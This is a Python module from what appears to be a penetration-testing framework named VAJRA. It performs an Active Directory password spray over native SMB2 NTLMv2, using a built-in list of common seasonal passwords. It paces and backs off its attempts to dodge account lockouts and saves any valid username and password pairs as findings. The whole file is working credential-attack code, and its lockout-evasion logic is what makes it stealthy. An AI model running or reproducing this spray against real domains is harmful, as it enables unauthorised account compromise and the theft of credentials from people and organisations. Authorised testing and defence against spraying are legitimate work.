"""VAJRA AD password spray — native SMB2 NTLMv2, lockout-aware,
pass-the-hash aware, with dynamic backoff."""
import time

from core.database import Finding
from core.crypto_mini import SMB_STATUS
from modules.ad.smb_recon import validate_creds

SPRAY_SET = ["Password1", "Welcome1", "Summer2024!", "Winter2024!",
             "Spring2025!", "Autumn2024!", "Company01", "changeme",
             "Monday01!", "P@ssw0rd"]

LOCKOUT_ABORT = {"ACCOUNT-LOCKED"}

# Dynamic backoff: start cautiously, ramp delay up if lockout signals appear,
# and never exceed this ceiling (a locked domain is a failed engagement).
MIN_DELAY = 1.0
MAX_DELAY = 30.0
BACKOFF_FACTOR = 2.0


def run(engine):
    t = engine.target
    if not engine.deep:
        return
    host = t.scan_host()
    ad = engine.state.get("ad") or {}
    domain = ad.get("domain") or ""
    users_pool = engine.state.get("ad_users") or []
    if not users_pool:
        try:
            users_pool = engine._wl("ad_users.txt")
        except Exception:
            users_pool = []
    pwds_pool = None
    try:
        pwds_pool = engine._wl("ad_passwords.txt")
    except Exception:
        pass
    spray_list = SPRAY_SET[:8] if not pwds_pool else \
        sorted(set(SPRAY_SET[:4]) | set(pwds_pool[:12]))
    base_delay = float(engine.cfg("spray_delay", 2.5))
    delay = max(MIN_DELAY, min(MAX_DELAY, base_delay))
    creds = getattr(engine, "ad_creds", {})
    hits, locked, tried = [], set(), 0
    lockout_signals = 0   # count of near-lockout responses -> raise delay

    for pwd in spray_list:
        if creds.get("password") == pwd or creds.get("nthash"):
            continue
        for user in users_pool:
            st, _av = validate_creds(host, user, password=pwd,
                                     domain=domain)
            tried += 1

            # Dynamic backoff: any lockout-family response means we're
            # approaching the threshold on THIS account — widen the delay.
            locked_now = st in LOCKOUT_ABORT
            if locked_now:
                locked.add(user)
                lockout_signals += 1
                delay = min(MAX_DELAY, delay * BACKOFF_FACTOR)
                engine.log.warn("[spray] lockout signal (%s) -> widening "
                                "delay to %.1fs" % (user, delay))
                if len(locked) >= 3:
                    break
            elif st.startswith(("SUCCESS", "access-denied",
                                "password-expired",
                                "account-disabled")):
                hits.append((user, pwd))
                engine.log.finding("[spray] %s:%s VALID" % (user, pwd))
                # A hit means a valid prior password on the list — stop the
                # same-user tail risk, don't widen delay.
            if delay:
                time.sleep(delay)
        if locked and len(locked) >= 3:
            engine.log.warn("[spray] aborting — lockout threshold hit "
                            "(%d accounts, widest delay %.1fs)"
                            % (len(locked), delay))
            break
        if hits:
            break

    if hits:
        listing = "\n".join("AD %s:%s" % h for h in hits)
        try:
            engine.save_evidence("ad_spray_hits.txt", listing)
        except Exception:
            pass
        engine.db.add_finding(Finding(
            t.display,
            "ad.spray", "credentials", "critical",
            "AD PASSWORD SPRAY SUCCEEDED: %d valid pair(s)" % len(hits),
            detail="Native SMB2 NTLMv2 authentication; dynamic lockout-aware "
                   "pacing (%d attempts, %d accounts flagged locked, "
                   "delay %s)." % (tried, len(locked),
                                   "ramped to %.1fs" % delay
                                   if lockout_signals else base_delay),
            evidence=listing[:2000],
            remediation="Smart lockouts + MFA; alert on multi-user single-"
                        "password patterns.", confidence="firm"))
        box = engine.state.setdefault("creds", [])
        box.extend(("ad/smb", u, p) for u, p in hits)
    else:
        engine.db.add_event(t.display, "ad.spray",
                            "%d attempts, no hits (locked=%d, delay ramped to "
                            "%.1fs)" % (tried, len(locked), delay))
